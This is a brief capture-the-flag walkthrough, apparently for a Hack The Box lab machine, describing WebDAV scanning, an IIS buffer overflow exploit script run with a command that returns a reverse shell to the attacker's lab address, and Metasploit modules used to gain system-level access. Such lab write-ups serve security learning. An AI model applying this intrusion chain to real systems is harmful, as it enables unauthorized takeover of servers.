Step 1 (Scanning)
- target was running port 80 with a WebDav client enabled allowing too many options
- running the IIS version in searchsploit shows us a ScStoragePathFromUrl buffer overflow vulnerability

Step 2 (Foothold)
- running a google search for the overflow vulnerability we find the script 'https://github.com/xerosignal/Hack-The-Box-Granny-And-Grandpa/blob/master/explodingvenom.py'
- placing a msfconsole exploit/multi/handler to the payload windows/meterpreter/reverse_tcp and allowing it to run we are ready to catch the reverse shell
- running the syntax "sudo python explodingvenom.py http://10.10.10.15:80/ 10.10.14.11 4444" gives us a reverse shell
- normally at this stage id use living off the land techiques to transfer files between my machine and the target but none of my methods worked and i was on a roll

Step 3 (Priviledge Escalation)
- running post/multi/recon/local_exploit_suggester we are given a list of possible priviledge escalation scripts
- trying exploit/windows/local/ms14_070_tcpip_ioctl returns a system level reverse shell
